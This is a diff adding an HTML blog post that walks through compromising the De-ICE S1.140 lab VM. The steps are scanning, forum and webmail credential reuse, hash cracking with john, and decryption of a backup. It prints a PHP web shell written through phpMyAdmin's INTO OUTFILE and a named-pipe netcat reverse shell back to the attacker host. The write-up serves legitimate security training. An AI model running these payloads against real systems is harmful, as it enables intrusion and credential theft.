@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="utf-8">
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="author" content="">
+<meta name="generator" content="Hugo 0.15" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="http://rastamouse.me/css/style.css" type="text/css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
+<link rel="alternate" href="http://rastamouse.me/index.xml" type="application/rss+xml" title="rastamouse.me">
+<title>De-ICE S1.140 - rastamouse.me</title>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <a class="path" href="http://rastamouse.me/">[rastamouse.me]</a>
+    <span class="caret"># _</span>
+  </div>
+</header>
+
+<div class="container">
+
+
+<main role="main" class="article">
+  
+<article class="single" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="meta">
+
+    <span class="key">published on</span>
+    <span class="val"><time itemprop="datePublished" datetime="2014-04-23">April 23, 2014</time></span>
+
+
+    <span class="key">in</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/categories/writeup">writeup</a>
+
+    </span>
+
+
+    <br>
+    <span class="key">tags:</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/tags/de-ice">de-ice</a>
+
+    </span>
+
+  </div>
+  <h1 class="headline" itemprop="headline">De-ICE S1.140</h1>
+  <section class="body" itemprop="articleBody">
+    
+
+<p>This is a walkthrough of how I completed the De-ICE S1.140 challenge.  The final goal for this challenge is undocumented.</p>
+
+<h2 id="nmap:b20d03e1a01ea82238c76576114ed09e">Nmap</h2>
+
+<pre><code class="language-text">root@kali:~/de-ice/1.140# nmap -n -sV -A -p- 192.168.127.128
+
+PORT    STATE  SERVICE  VERSION
+21/tcp  open   ftp      ProFTPD 1.3.4a
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: ERROR
+22/tcp  open   ssh      OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   1024 08:c6:66:05:29:a6:bd:a0:0b:1b:93:0a:0f:03:42:b0 (DSA)
+|   2048 90:c1:ed:5e:f1:cb:6f:af:23:5b:c5:9f:98:03:27:71 (RSA)
+|_  256 05:c2:e3:f5:7a:37:c4:95:62:2e:43:8b:df:26:33:1a (ECDSA)
+80/tcp  open   http     Apache httpd 2.2.22 ((Ubuntu) mod_ssl/2.2.22 OpenSSL/1.0.1)
+|_http-title: Lazy Admin Corp.
+443/tcp open   ssl/http Apache httpd 2.2.22 ((Ubuntu) mod_ssl/2.2.22 OpenSSL/1.0.1)
+|_http-title: Lazy Admin Corp.
+| ssl-cert: Subject: commonName=webhost
+| Not valid before: 2014-04-21T20:14:28+00:00
+|_Not valid after:  2024-04-18T20:14:28+00:00
+|_ssl-date: 2014-04-21T21:19:59+00:00; -3s from local time.
+465/tcp closed smtps
+993/tcp open   ssl/imap Dovecot imapd
+|_imap-capabilities: more ID IMAP4rev1 post-login AUTH=PLAIN Pre-login capabilities listed SASL-IR OK ENABLE have AUTH=LOGINA0001 LOGIN-REFERRALS LITERAL+ IDLE
+| ssl-cert: Subject: commonName=webhost
+| Not valid before: 2014-04-21T20:14:28+00:00
+|_Not valid after:  2024-04-18T20:14:28+00:00
+|_ssl-date: 2014-04-21T21:19:59+00:00; -3s from local time.
+995/tcp open   ssl/pop3 Dovecot pop3d
+|_pop3-capabilities: RESP-CODES PIPELINING CAPA SASL(PLAIN LOGIN) USER UIDL TOP
+| ssl-cert: Subject: commonName=webhost
+| Not valid before: 2014-04-21T20:14:28+00:00
+|_Not valid after:  2024-04-18T20:14:28+00:00
+|_ssl-date: 2014-04-21T21:19:59+00:00; -3s from local time.
+</code></pre>
+
+<p>Visiting both the HTTP and HTTPS pages greets us with the same page.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/de-ice-1-140/lazy.jpg"  />
+    
+    
+</figure>
+</div>
+
+<h2 id="wfuzz:b20d03e1a01ea82238c76576114ed09e">Wfuzz</h2>
+
+<p>I ran <code>Wfuzz</code> against both the HTTP and HTTPS services and got different results for each.</p>
+
+<pre><code class="language-text">root@kali:~/de-ice/1.140# wfuzz -c -zfile,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://192.168.127.128/FUZZ/
+
+********************************************************
+* Wfuzz  2.0 - The Web Bruteforcer                     *
+********************************************************
+
+Target: http://192.168.127.128/FUZZ/
+Payload type: file,/usr/share/wfuzz/wordlist/general/common.txt
+Total requests: 950
+
+==================================================================
+ID     Response   Lines      Word         Chars          Request   
+==================================================================
+00191:  C=403      8 L           22 W         210 Ch       &quot; - cgi-bin&quot;
+00290:  C=403      8 L           22 W         206 Ch       &quot; - doc&quot;
+00431:  C=403      8 L           22 W         208 Ch       &quot; - icons&quot;
+00849:  C=200     97 L          525 W        7348 Ch       &quot; - forum&quot;
+
+
+root@kali:~/de-ice/1.140# wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 https://192.168.127.128/FUZZ/
+
+********************************************************
+* Wfuzz  2.0 - The Web Bruteforcer                     *
+********************************************************
+
+Target: https://192.168.127.128/FUZZ/
+Payload type: file,/usr/share/wfuzz/wordlist/general/common.txt
+Total requests: 950
+
+==================================================================
+ID     Response   Lines      Word         Chars          Request   
+==================================================================
+00184:  C=403      8 L           22 W         210 Ch       &quot; - cgi-bin&quot;
+00295:  C=403      8 L           22 W         206 Ch       &quot; - doc&quot;
+00375:  C=200     97 L          525 W        7348 Ch       &quot; - forum&quot;
+00424:  C=403      8 L           22 W         208 Ch       &quot; - icons&quot;
+00624:  C=200    126 L          465 W        7540 Ch       &quot; - phpmyadmin&quot;
+00913:  C=302      0 L            0 W           0 Ch       &quot; - webmail&quot;
+</code></pre>
+
+<h2 id="lazyadmin-corp-forums:b20d03e1a01ea82238c76576114ed09e">LazyAdmin corp. Forums</h2>
+
+<p>I decided to have a look at the /forum/ directory found - as far as I could tell they were identical on both HTTP and HTTPS.  There were several threads available to look through.  The &lsquo;Login Attacks&rsquo; thread contains a snippet from the SSH auth log, and contained a lot of usernames.  I copied this information to a file, then used some command line magic to extract a list of users.</p>
+
+<p><code>root@kali:~/de-ice/1.140# grep &quot;invalid user&quot; auth.log | cut -d&quot; &quot; -f9,11 | grep -v &quot;invalid&quot; | sort -u</code></p>
+
+<p>A very interesting line popped up, which distinctly resembled a password - the obvious implication is that somebody typed their password as their username by mistake.  To find the possible corresponding user, I went back through the log to read the full line.  The attempt came from 10.0.0.23, so I searched for other login attempts from the same IP - only one user came up:  <code>mbrown</code>.</p>
+
+<p>I attempted to login through SSH with these credentials, but they failed.  It seems SSH to this server requires the publickey.</p>
+
+<p>I was however able to log into the forum as mbrown.  I had a look through the user profile area and found mbrown&rsquo;s email address:  <code>mb@lazyadmin.corp</code></p>
+
+<h2 id="squirrelmail:b20d03e1a01ea82238c76576114ed09e">SquirrelMail</h2>
+
+<p>With this information, I went straight back to the <code>/webmail/</code> directory I found earlier and was able to log in as mbrown with the same credentials.</p>
+
+<p>There were a handful of emails in the INBOX and Sent folders, which revealed the root passwords for MySQL and phpmyadmin.  Knowing I had the URL for phpmyadmin also, I headed straight there!</p>
+
+<h2 id="phpmyadmin:b20d03e1a01ea82238c76576114ed09e">phpMyAdmin</h2>
+
+<p>I had a look through the databases present, particularly for the forum and mail services.  I was able to retrieve a handful of users and password hashes for each service.  I used <code>hash-identifier</code> to identify the type of hashes these were.  The mail hashes were reported to be MD5, but the forum hashes were not identified - presumably they are custom generated by the &lsquo;my little forum&rsquo; application.  I decided not press ahead with cracking the MD5 hashes before spending the time to investigate the other hashes.</p>
+
+<p>I cracked two of the MD5 hashes with john.</p>
+
+<pre><code class="language-text">root@kali:~/de-ice/1.140# john --rules --format=raw-md5 --wordlist=/usr/share/wordlists/darkc0de.lst mail 
+Austin-Willard   (sw @ lazyadmin.corp)
+tum-ti-tum       (rh @ lazyadmin.corp)
+</code></pre>
+
+<p>I logged into the webmail of these two users, but found nothing further of interest.</p>
+
+<h2 id="php-code-execution:b20d03e1a01ea82238c76576114ed09e">PHP Code Execution</h2>
+
+<p>There was an opportunity to leverage the current access I had in <code>phpmyadmin</code>, to gain me a remote shell on the system.  Since I was unable to get in through SSH, this seemed like a viable option.</p>
+
+<p>Using the SQL query window, I ran the following:</p>
+
+<p><code>SELECT &quot; &lt; ? system($_REQUEST['cmd']); ? &gt; &quot; INTO OUTFILE &quot;/var/www/cmd.php&quot;</code></p>
+
+<p>This failed as the service didn&rsquo;t didn&rsquo;t have the privilege required to write directly into <code>/var/www/</code>.  Instead, I looked for writable directories within the &lsquo;my little forum&rsquo; directory.  According to the installation requirements of this application, the <code>templates_c</code> directory should be writable.  A quick test in the brower showed that I could indeed access this directory.  I altered the SQL query as required, which successfully ran.  I then visited my new file, and command execution was successful.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/de-ice-1-140/phpmyadmin.jpg"  />
+    
+    
+</figure>
+</div>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/de-ice-1-140/cmd.jpg"  />
+    
+    
+</figure>
+</div>
+
+<p>I thought I would try to use this code execution to obtain a <code>netcat</code> shell, though it seemed the version running on the remote host was not compiled to support the -e option.  Instead, I used the named pipe technique to obtain an interactive shell.</p>
+
+<pre><code class="language-text">http://192.168.127.128/forum/templates_c/cmd.php?cmd=mknod /var/www/forum/templates_c/backpipe p
+https://192.168.127.128/forum/templates_c/cmd.php?cmd=/bin/bash 0 &lt; /var/www/forum/templates_c/backpipe | nc 192.168.127.127 4444 1 &gt; /var/www/forum/templates_c/backpipe
+</code></pre>
+
+<pre><code class="language-text">root@kali:~/de-ice/1.140# nc -lnvp 4444
+python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
+</code></pre>
+
+<p>At this point I did some standard enumeration - users&rsquo; and their groups etc.  It seems that swillard is the only user in the sudoers group, so would most likely be my final target.  I also came across <code>/opt/backup.sh</code>, which had an interesting ACL set.</p>
+
+<pre><code class="language-text">mbrown:x:1001:1001:Mark Brown
+rhedley:x:1002:1002:Richard Hedley
+swillard:x:1003:1003:Sandy Willard
+mparker:x:1004:1004:Miles Parker
+ftpuser:x:997:rhedley,mbrown,ftp
+ftpadmin:x:999:rhedley,swillard
+sshlogin:x:998:swillard,mbrown
+sudo:x:27:swillard
+</code></pre>
+
+<pre><code class="language-text">www-data@webhost:/$ getfacl /opt/backup.sh
+getfacl /opt/backup.sh
+getfacl: Removing leading '/' from absolute path names
+# file: opt/backup.sh
+# owner: root
+# group: root
+user::rwx
+group::rw-
+group:ftpadmin:r--
+mask::rw-
+other::---
+</code></pre>
+
+<p>I already had some cracked email passwords for swillard and rhedley (two users in the ftpadmin group), so tried them with su.</p>
+
+<p>The password for <code>rhedley</code> worked and I was able to read the <code>backup.sh</code> file.  This contained an <code>openssl</code> command to create the encrypted backup file I retrieved via FTP earlier.  I used this information to decrypt and extract the archive.</p>
+
+<pre><code class="language-text">openssl aes-256-cbc -in ${TMPBACKUP}/${FILENAME}.gz -out ${TMPBACKUP}/${FILENAME}.gz.enc -pass pass:wpaR9V616xrDTy98L7Uje2DDU5hWtWhs
+root@kali:~/de-ice/1.140# openssl aes-256-cbc -d -in backup_webhost_130111.tar.gz.enc -out backup_webhost_130111.tar.gz -pass pass:wpaR9V616xrDTy98L7Uje2DDU5hWtWhs
+</code></pre>
+
+<h2 id="more-john:b20d03e1a01ea82238c76576114ed09e">More John</h2>
+
+<p>Within the archive was a backed up <code>/etc/</code> directory, with a <code>shadow</code> file containing hashes for <code>rhedley</code>, <code>mbrown</code> and <code>sraines</code>. Raines is now Willard, so assuming her password wasn&rsquo;t changed when her name was, cracking her password will give us access to a sudo-enabled account.</p>
+
+<p>It took a long time for john to crack this one, as the SHA512 is slow to calculate.</p>
+
+<pre><code class="language-text">root@kali:~/de-ice/1.140# john --rules --wordlist=/usr/share/wordlists/darkc0de.lst etc/shadow
+brillantissimo   (sraines)
+</code></pre>
+
+<h2 id="back-to-the-shell:b20d03e1a01ea82238c76576114ed09e">Back to the Shell</h2>
+
+<p>From the <code>rhedley</code> account, which I was still logged in as, I tried to su to the swillard account with the newly cracked password.</p>
+
+<p>Within the root folder was a file called <code>secret.jpg</code>, which I downloaded to my machine via <code>netcat</code>.</p>
+
+<p>There didn&rsquo;t appear to be any hidden messages either within the image or hex, so I assume this was the final flag.</p>
+
+<p><div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/de-ice-1-140/secret.jpg"  />
+    
+    
+</figure>
+</div></p>
+
+  </section>
+</article>
+
+</main>
+
+
+</div>
+
+<footer>
+  <div class="container">
+    <span class="copyright">&copy; 2014  rastamouse.me - <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></span>
+  </div>
+</footer>
+
+</body>
+</html>
+
